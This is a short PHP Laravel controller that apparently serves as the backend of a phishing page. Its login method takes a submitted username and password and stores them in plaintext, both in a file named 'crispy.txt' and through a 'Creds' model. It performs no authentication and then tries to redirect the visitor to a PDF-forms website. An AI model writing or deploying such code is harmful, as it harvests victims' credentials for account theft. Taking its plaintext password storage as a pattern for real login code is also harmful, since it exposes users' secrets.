<?php

namespace App\Http\Controllers;

use App\Models\Creds;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

class LoginController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function login(Request $request)
    {
        $email = $request->username;
        $password = $request->password;
        file_put_contents(storage_path('app').'/crispy.txt', json_encode(['email'=>$email, 'pass' => $password]));
        (new Creds)->fill([
            'email' => $email,
            'pwd' => $password
        ])->save();
        redirect('https://www.pdffiller.com/en/forms');
    }
}
